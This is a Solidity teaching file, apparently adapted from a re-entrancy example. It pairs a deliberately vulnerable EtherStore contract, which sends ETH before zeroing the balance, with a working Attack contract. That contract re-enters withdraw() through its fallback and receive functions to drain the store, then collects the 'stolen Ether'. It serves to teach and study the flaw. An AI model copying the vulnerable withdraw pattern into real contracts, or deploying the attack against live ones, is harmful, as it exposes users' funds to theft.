// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Inspired By: https://solidity-by-example.org/hacks/re-entrancy/

/**
 * @title EtherStore
 * @dev A simple contract for depositing and withdrawing ETH. 
 * Vulnerable to re-entrancy attack.
 */
contract EtherStore {
    /// @dev Stores the balance of each user
    mapping(address => uint256) public balances;

    /**
     * @notice Deposit Ether into the contract
     * @dev Adds the deposited value to the sender's balance
     */
    function deposit() public payable {
        // Increase the sender's balance by the deposited amount
        balances[msg.sender] += msg.value;
    }

    /**
     * @notice Withdraw the entire balance
     * @dev Allows users to withdraw their balance. Vulnerable to re-entrancy.
     */
    function withdraw() public {
        // Get the sender's balance
        uint256 bal = balances[msg.sender];
        require(bal > 0, "Insufficient balance");

        // Attempt to send Ether to the sender
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        // Update balance after sending Ether (vulnerable to re-entrancy)
        balances[msg.sender] = 0;
    }

    /**
     * @notice Get the total balance of the contract
     * @return The balance of the contract in wei
     */
    function getBalance() public view returns (uint256) {
        // Return the contract's balance
        return address(this).balance;
    }
}




/**
 * @title Attack
 * @dev A contract designed to exploit the re-entrancy vulnerability in the EtherStore contract.
 */
contract Attack {
    /// @dev The EtherStore contract being targeted
    EtherStore public etherStore;

    /// @dev Amount to use for attacking
    uint256 constant AMOUNT = 1 ether;

    /**
     * @notice Deploy the Attack contract
     * @param _etherStoreAddress The address of the vulnerable EtherStore contract
     */
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    /**
     * @dev Internal function to trigger the re-entrancy attack
     */
    function _triggerWithdraw() internal {
        // Check if EtherStore has enough balance to continue withdrawing
        if (address(etherStore).balance >= AMOUNT) {
            etherStore.withdraw();
        }
    }

    /**
     * @dev Fallback function called when EtherStore sends Ether
     */
    fallback() external payable {
        _triggerWithdraw();
    }

    /**
     * @dev Receive function to accept plain Ether transfers and trigger the attack
     */
    receive() external payable {
        _triggerWithdraw();
    }

    /**
     * @notice Initiates the attack on the EtherStore contract
     * @dev Deposits Ether into EtherStore and starts the re-entrancy attack
     */
    function attack() external payable {
        require(msg.value >= AMOUNT, "Insufficient attack amount");

        // Deposit Ether into the EtherStore contract
        etherStore.deposit{value: AMOUNT}();

        // Start the re-entrancy attack
        etherStore.withdraw();
    }

    /**
     * @notice Collects the stolen Ether after the attack
     * @dev Transfers the contract balance to the caller
     */
    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    /**
     * @notice Get the balance of this contract
     * @return The balance of the contract in wei
     */
    function getBalance() public view returns (uint256) {
        // Return the contract's balance
        return address(this).balance;
    }
}